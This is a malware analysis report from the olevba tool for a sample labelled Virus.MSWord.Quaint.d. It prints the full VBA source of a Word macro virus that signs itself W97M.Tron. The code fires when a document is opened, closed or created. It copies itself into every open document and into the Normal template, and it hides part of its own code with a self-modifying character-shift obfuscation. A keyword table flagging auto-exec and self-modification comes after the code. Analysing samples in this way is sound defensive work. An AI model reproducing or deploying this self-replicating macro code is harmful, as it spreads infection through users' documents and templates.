olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quaint.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quaint.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Tron
Private Sub Document_Open(): On Error Resume Next: Dim x, c: j = j + 1
Dim linKoda2, s
If Left(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(33, 1), 1) = "'" Then
For E = 33 To 34
desni = Right(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(E, 1), _
(Len(ThisDocument.VBProject.vbcomponents(1).codemodule.lines(E, 1)) - 1))
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline E, desni
Next
For f = 33 To 34
linKoda2 = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(f, 1)
For s = 1 To Len(linKoda2)
nov = nov & Chr(Asc(Mid(linKoda2, s)) + 3)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline f, nov
nov = ""
Next
Else
For f = 33 To 34
linKoda2 = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(f, 1)
For s = 1 To Len(linKoda2)
nov = nov & Chr(Asc(Mid(linKoda2, s)) - 3)
Next
ThisDocument.VBProject.vbcomponents(1).codemodule.replaceline f, "'" & nov
nov = ""
Next
End If
For t = 1 To Documents.Count
If Documents(t).VBProject.vbcomponents(j).codemodule.lines(j, j) <> "'Tron" Then
linKoda = ThisDocument.VBProject.vbcomponents(j).codemodule.lines(j, ThisDocument.VBProject.vbcomponents(j).codemodule.countoflines)
With Documents(t).VBProject.vbcomponents(j).codemodule
If .lines(j, j) <> "'Tron" Then
'+abibqbifkbp
g)
+`lrkqlcifkbp
'+^aacoljpqofkd
ifkHla^
ActiveDocument.VBProject.Description = "W97M.Tron by e[ax] / Species VL"
End If
End With
End If
Next
Set norm = NormalTemplate
If norm.VBProject.vbcomponents(j).codemodule.lines(j, j) <> "'Tron" Then
With norm.VBProject.vbcomponents(j).codemodule
trm = Trim$(ThisDocument.VBProject.vbcomponents(j).codemodule.lines(j, ThisDocument.VBProject.vbcomponents(j).codemodule.countoflines)): .deletelines j, .countoflines: .addfromstring trm
End With
End If
End Sub
Private Sub Document_Close(): Document_Open: End Sub
Private Sub Document_New(): Document_Open: End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

